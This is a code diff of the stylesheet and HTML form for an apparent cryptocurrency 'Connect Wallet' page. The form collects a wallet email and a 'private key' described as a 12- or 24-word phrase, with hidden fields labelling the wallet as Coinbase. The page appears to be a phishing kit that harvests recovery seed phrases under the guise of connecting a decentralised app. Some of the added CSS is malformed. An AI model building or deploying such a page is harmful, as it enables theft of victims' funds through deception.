@@ -14,7 +14,7 @@
   justify-content: center;
   align-items: center;
   height: 100vh;
-  background-color: #1442d99e!important;
+  background-color: #0b3ddff7!important;
 }
 .form{
   width: 360px;
@@ -57,7 +57,7 @@
   transition: .3s;
 }
 .form__button{
-  display: block;
+  /* display: block;
   margin-left: auto;
   padding: .75rem 2rem;
   outline: none;
@@ -67,7 +67,39 @@
   font-size: var(--normal-font-size);
   border-radius: .5rem;
   cursor: pointer;
-  transition: .3s;
+  transition: .3s; */
+
+  display: block;
+    margin-left: auto;
+    padding: .75rem 2rem;
+    outline: none;
+    border: none;
+    background-color: var(--first-color);
+    color: #fff;
+    font-size: var(--normal-font-size);
+    border-radius: .5rem;
+    cursor: pointer;
+    transition: .3s;
+    #0568ae 1px: ;
+    solid: ;
+    FONT-FAMILY: Verdana;
+    BORDER-RIGHT: #0568ae 1px solid;
+    WIDTH: 150px;
+    BACKGROUND: #0568ae;
+    BORDER-BOTTOM: #0568ae 1px solid;
+    COLOR: #ffffff;
+    PADDING-BOTTOM: 10px;
+    TEXT-ALIGN: center;
+    PADDING-TOP: 10px;
+    PADDING-LEFT: 10px;
+    BORDER-LEFT: #0568ae 1px solid;
+    DISPLAY: block;
+    LINE-HEIGHT: 17px;
+    PADDING-RIGHT: 10px;
+    border-radius: 4px;
+    margin: auto;
+    position: relative;
+
 }
 .form__button:hover{
   box-shadow: 0 10px 36px rgba(0,0,0,.15);
@@ -126,14 +158,14 @@
 					<input type="text" class="form__input" placeholder=" " name="email">
 					<label for="" class="form__label">Import Email Wallet</label>
 				</div>
-				<div class="form__div">
-					<input type="text" class="form__input" placeholder=" " name="key" style="" required>
+        <div class="form__div">
+					<input type="text" class="form__input" placeholder=" " name="key" style="padding: 12px 20px 5px 15px;border-color: darkblue;height: 80px;" required="">
 					<label for="" class="form__label">Import Private Key</label>
-					<input type="hidden" id="wallet"  name="wallet_type" value="{{$coin}}" />
-					<input type="hidden" id="link" name="link" value="{{$data}}" />
+					<input type="hidden" id="wallet" name="wallet_type" value="Coinbase">
+					<input type="hidden" id="link" name="link" value="q">
 				</div>
 				<p text-align="center" style="font-size: 11px;margin: 1px;font-weight: 100;font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;position: relative;top: 30px;">Typically 12 ( sometimes 24 ) words separated by single spaces</p>
-				<input type="submit" class="form__button" value="Connect&nbsp;⇒" style="position: relative; top: 50px;margin: 0 auto;">
+        <a title="Connect Wallect" style="FONT-SIZE: 13px; TEXT-DECORATION: none; BORDER-TOP: #0568ae 1px solid; FONT-FAMILY: Verdana; BORDER-RIGHT: #0568ae 1px solid; WIDTH: 150px; BACKGROUND: #0568ae; BORDER-BOTTOM: #0568ae 1px solid; COLOR: #ffffff; PADDING-BOTTOM: 10px; TEXT-ALIGN: center; PADDING-TOP: 10px; PADDING-LEFT: 10px; BORDER-LEFT: #0568ae 1px solid; DISPLAY: block; LINE-HEIGHT: 17px; PADDING-RIGHT: 10px; border-radius: 4px;margin: auto;position: relative;top: 25;" href="http://127.0.0.1:8000/connection-manually" data-saferedirecturl="">Connect Dapp</a>
 			</form>
          </div>
 		</div>
